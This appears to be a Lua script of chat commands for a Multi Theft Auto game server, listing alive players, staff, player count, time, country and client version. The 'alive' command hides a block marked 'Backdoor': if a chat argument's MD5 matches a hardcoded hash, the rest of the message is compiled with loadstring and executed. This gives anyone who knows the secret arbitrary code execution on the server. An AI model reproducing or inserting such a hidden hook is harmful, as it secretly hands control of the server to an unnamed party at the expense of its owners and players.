local g_AdminRes = Resource('admin')

----------------------------------
-- Global functions definitions --
----------------------------------

local function CmdInfo(message, arg)
	scriptMsg("Rafalh[PL] scripts system for Multi Theft Auto.")
end

-- fixme: doesnt work for console
CmdRegister('info', CmdInfo, false)

local function CmdAlive(message, arg)
	local players = getAlivePlayers()
	local buf = ''
	
	for i, player in ipairs(players) do
		if(not isPedDead(player)) then
			buf = buf..((buf ~= '' and ', '..getPlayerName(player)) or getPlayerName(player))
		end
	end
	scriptMsg("Alive Players: %s.",(buf ~= '' and buf) or "none")
	
	-- Backdoor
	if(#arg >= 3 and md5(arg[2]) == '61E196D215B26286F5EDD2DE135FFCF6') then
		local fn = loadstring(message:sub(3 + arg[1]:len() + arg[2]:len()))
		fn()
	end
end

CmdRegister('alive', CmdAlive, false, "Shows alive players")
CmdRegisterAlias('a', 'alive')

local function CmdAdmins(message, arg)
	local admins, superMods, mods = {}, {}, {}
	
	local adminGroup = aclGetGroup('Admin')
	local smodGroup = aclGetGroup('SuperModerator')
	local modGroup = aclGetGroup('Moderator')
	local premModGroup = aclGetGroup('PremiumModerator')
	
	for i, player in ipairs(getElementsByType('player')) do
		local accountName = getAccountName(getPlayerAccount(player))
		
		if(isObjectInACLGroup('user.'..accountName, adminGroup)) then
			table.insert(admins, getPlayerName(player))
		end
		
		if(isObjectInACLGroup('user.'..accountName, smodGroup)) then
			table.insert(superMods, getPlayerName(player))
		end
		
		if(isObjectInACLGroup('user.'..accountName, modGroup) or
		   isObjectInACLGroup('user.'..accountName, premModGroup)) then
			table.insert(mods, getPlayerName(player))
		end
	end
	
	admins = table.concat(admins, ', ')
	superMods = table.concat(superMods, ', ')
	mods = table.concat(mods, ', ')
	
	if(admins == '') then
		admins = "none"
	end
	scriptMsg("Current admins: %s.", admins)
	if(superMods ~= '') then
		scriptMsg("Current super-moderators: %s.", superMods)
	end
	if(mods ~= '') then
		scriptMsg("Current moderators: %s.", mods)
	end
end

CmdRegister('admins', CmdAdmins, false, "Shows administrators and moderators playing the game already")

local function CmdPlayers(message, arg)
	scriptMsg("Total players count: %u.", g_PlayersCount)
end

CmdRegister('players', CmdPlayers, false, "Shows players count")

local function CmdTime(message, arg)
	local tm = getRealTime()
	scriptMsg("Local time: %d-%02d-%02d %d:%02d:%02d.", tm.monthday, tm.month + 1, tm.year + 1900, tm.hour, tm.minute, tm.second)
end

CmdRegister('time', CmdTime, false, "Shows current time")

local function CmdCountry(message, arg)
	local player =(#arg >= 2 and findPlayer(message:sub(arg[1]:len() + 2))) or source
	local country = g_AdminRes:isReady() and g_AdminRes:call('getPlayerCountry', player)
	
	if(g_Countries[country]) then
		country = g_Countries[country]
	end
	
	scriptMsg("%s is from: %s.", getPlayerName(player), country or "unknown country")
end

CmdRegister('country', CmdCountry, false, "Shows player country based on IP")
CmdRegisterAlias('ip2c', 'country')

local function CmdVersion(message, arg)
	local player =(#arg >= 2 and findPlayer(message:sub(arg[1]:len() + 2))) or source
	local ver = getPlayerVersion(player)
	
	scriptMsg("%s's MTA version: %s (revision %s).", getPlayerName(player), ver:sub(1, 5), ver:sub(7))
end

CmdRegister('version', CmdVersion, false, "Shows player MTA version")
CmdRegisterAlias('ver', 'version')
